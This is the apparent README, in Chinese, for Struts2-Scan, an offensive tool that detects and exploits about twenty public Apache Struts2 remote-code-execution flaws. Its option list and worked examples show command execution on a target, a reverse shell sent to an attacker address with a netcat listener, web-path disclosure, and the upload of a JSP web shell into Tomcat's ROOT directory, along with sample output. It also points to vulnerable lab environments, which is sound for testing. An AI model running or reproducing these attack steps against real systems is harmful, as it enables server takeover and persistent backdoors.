# Struts2-Scan

+ Struts2漏洞利用扫描工具，基于互联网上已经公开的Structs2高危漏洞exp的扫描利用工具，目前支持的漏洞如下: S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019, S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057
+ 支持单个URL漏洞检测和批量URL检测，至此指定漏洞利用，可获取WEB路径，执行命令，反弹shell和上传文件，注意，并不是所有的漏洞均支持上述功能，只有部分功能支持
+ 如有错误或者问题欢迎大家提问交流，一起解决

## 运行环境
+ Python3.6.X及其以上版本
+ 第三方库: click, requests, bs4
+ 测试环境: Ubuntu 16.04
+ 漏洞环境已上传，参考地址：
    + https://github.com/Medicean/VulApps/tree/master/s/struts2/
    + https://github.com/vulhub/vulhub/tree/master/struts2

## 工具参数说明
```
Usage: Struts2Scan.py [OPTIONS]

  Struts2批量扫描利用工具

Options:
  -i, --info          漏洞信息介绍
  -v, --version       显示工具版本
  -u, --url TEXT      URL地址
  -n, --name TEXT     指定漏洞名称, 漏洞名称详见info
  -f, --file TEXT     批量扫描URL文件, 一行一个URL
  -d, --data TEXT     POST参数, 需要使用的payload使用{exp}填充, 如: name=test&passwd={exp}
  -c, --encode TEXT   页面编码, 默认UTF-8编码
  -p, --proxy TEXT    HTTP代理. 格式为http://ip:port
  -t, --timeout TEXT  HTTP超时时间, 默认10s
  -w, --workers TEXT  批量扫描进程数, 默认为10个进程
  --header TEXT       HTTP请求头, 格式为: key1=value1&key2=value2
  -e, --exec          进入命令执行shell
  --webpath           获取WEB路径
  -r, --reverse TEXT  反弹shell地址, 格式为ip:port
  --upfile TEXT       需要上传的文件路径和名称
  --uppath TEXT       上传的目录和名称, 如: /usr/local/tomcat/webapps/ROOT/shell.jsp
  -q, --quiet         关闭打印不存在漏洞的输出，只保留存在漏洞的输出
  -h, --help          Show this message and exit.
```

## 使用例子
### 查看漏洞详细信息:
```
$ python3 Struts2Scan.py --info

 ____  _              _       ____    ____                  
/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __  
\___ \| __| '__| | | | __/ __| __) | \___ \ / __/ _` | '_ \ 
 ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |
|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|

                                      Author By HatBoy        

[+] 支持如下Struts2漏洞:
[+] S2-001:影响版本Struts 2.0.0-2.0.8; POST请求发送数据; 默认参数为:username,password; 支持获取WEB路径,任意命令执行和反弹shell
[+] S2-003:影响版本Struts 2.0.0-2.0.11.2; GET请求发送数据; 支持任意命令执行
[+] S2-005:影响版本Struts 2.0.0-2.1.8.1; GET请求发送数据; 支持获取WEB路径,任意命令执行
[+] S2-007:影响版本Struts 2.0.0-2.2.3; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell
[+] S2-008:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持任意命令执行和反弹shell
[+] S2-009:影响版本Struts 2.0.0-2.3.1.1; GET请求发送数据,URL后面需要请求参数名; 默认为: key; 支持任意命令执行和反弹shell
[+] S2-012:影响版本Struts Showcase App 2.0.0-2.3.13; GET请求发送数据,参数直接添加到URL后面; 默认为:name; 支持任意命令执行和反弹shell
[+] S2-013/S2-014:影响版本Struts 2.0.0-2.3.14.1; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传
[+] S2-015:影响版本Struts 2.0.0-2.3.14.2; GET请求发送数据; 支持任意命令执行和反弹shell
[+] S2-016:影响版本Struts 2.0.0-2.3.15; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传
[+] S2-019:影响版本Struts 2.0.0-2.3.15.1; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传
[+] S2-029:影响版本Struts 2.0.0-2.3.24.1(除了2.3.20.3); POST请求发送数据,需要参数; 默认参数:message; 支持任意命令执行和反弹shell
[+] S2-032:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell
[+] S2-033:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持任意命令执行和反弹shell
[+] S2-037:影响版本Struts 2.3.20-2.3.28.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell
[+] S2-045:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传
[+] S2-046:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传
[+] S2-048:影响版本Struts 2.3.x with Struts 1 plugin and Struts 1 action; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell
[+] S2-053:影响版本Struts 2.0.1-2.3.33,2.5-2.5.10; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell
[+] S2-devMode:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell
```

### 单个URL漏洞检测:
```
$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action

 ____  _              _       ____    ____                  
/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __  
\___ \| __| '__| | | | __/ __| __) | \___ \ / __/ _` | '_ \ 
 ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |
|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|

                                      Author By HatBoy        

[+] 正在扫描URL:http://192.168.100.8:8080/index.action
[*] ----------------results------------------
[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-046
[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-016
[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-045
[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-015
[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-009
[*] http://192.168.100.8:8080/index.action 存在漏洞: S2-012
```

### 批量漏洞检测:
```
$ python3 Struts2Scan.py -f urls.txt
```

### POST数据:
```
$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin&email=admin&age={exp}
```

### 指定漏洞名称利用:
```
# 命令执行
$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec

 ____  _              _       ____    ____                  
/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __  
\___ \| __| '__| | | | __/ __| __) | \___ \ / __/ _` | '_ \ 
 ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |
|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|

                                      Author By HatBoy        

>>>ls -la
total 136
drwxr-sr-x 1 root staff  4096 May  5  2017 .
drwxrwsr-x 1 root staff  4096 May  5  2017 ..
-rw-r----- 1 root root  57092 Apr 13  2017 LICENSE
-rw-r----- 1 root root   1723 Apr 13  2017 NOTICE
-rw-r----- 1 root root   7064 Apr 13  2017 RELEASE-NOTES
-rw-r----- 1 root root  15946 Apr 13  2017 RUNNING.txt
drwxr-x--- 1 root root   4096 May  5  2017 bin
drwx--S--- 1 root root   4096 Jul 12 14:54 conf
drwxr-sr-x 3 root staff  4096 May  5  2017 include
drwxr-x--- 2 root root   4096 May  5  2017 lib
drwxr-x--- 1 root root   4096 Jul 12 14:54 logs
drwxr-sr-x 3 root staff  4096 May  5  2017 native-jni-lib
drwxr-x--- 2 root root   4096 May  5  2017 temp
drwxr-x--- 1 root root   4096 Jul 12 14:54 webapps
drwxr-x--- 1 root root   4096 Jul 12 14:54 work
>>>

# 反弹shll
$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --reverse 192.168.100.8:8888

 ____  _              _       ____    ____                  
/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __  
\___ \| __| '__| | | | __/ __| __) | \___ \ / __/ _` | '_ \ 
 ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |
|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|

                                      Author By HatBoy        

[*] 请在反弹地址处监听端口如: nc -lvvp 8080

# 获取WEB路径
$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --webpath

 ____  _              _       ____    ____                  
/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __  
\___ \| __| '__| | | | __/ __| __) | \___ \ / __/ _` | '_ \ 
 ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |
|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|

                                      Author By HatBoy        

[*] /usr/local/tomcat/webapps/ROOT/

# 上传shell
$ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --upfile shell.jsp --uppath /usr/local/tomcat/webapps/ROOT/shell.jsp

 ____  _              _       ____    ____                  
/ ___|| |_ _ __ _   _| |_ ___|___ \  / ___|  ___ __ _ _ __  
\___ \| __| '__| | | | __/ __| __) | \___ \ / __/ _` | '_ \ 
 ___) | |_| |  | |_| | |_\__ \/ __/   ___) | (_| (_| | | | |
|____/ \__|_|   \__,_|\__|___/_____| |____/ \___\__,_|_| |_|

                                      Author By HatBoy        

[+] 文件上传成功!
```
